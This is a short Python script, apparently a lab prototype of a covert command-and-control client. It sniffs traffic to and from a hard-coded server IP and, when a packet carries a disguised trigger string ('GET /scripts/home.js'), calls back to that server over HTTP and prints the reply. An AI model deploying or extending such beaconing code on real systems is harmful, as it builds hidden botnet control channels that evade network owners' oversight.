from scapy.all import *
import random
import sys
import socket



#command server ip
serverIP = "130.245.170.45"

def respondToServer(pkt):
	if hasattr(pkt, "load"):
		#respond if a packet from the server includes this string
		if "GET /scripts/home.js" in str(pkt.load):
			print("command received")
			request = ('GET / HTTP/1.1\nHost: ' + serverIP + '\n\n').encode()
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((serverIP, 80))
			s.send(request)
			result = s.recv(128)
			if (len(result) > 0):
				print(result)

sniff(filter="host " + serverIP, prn=respondToServer)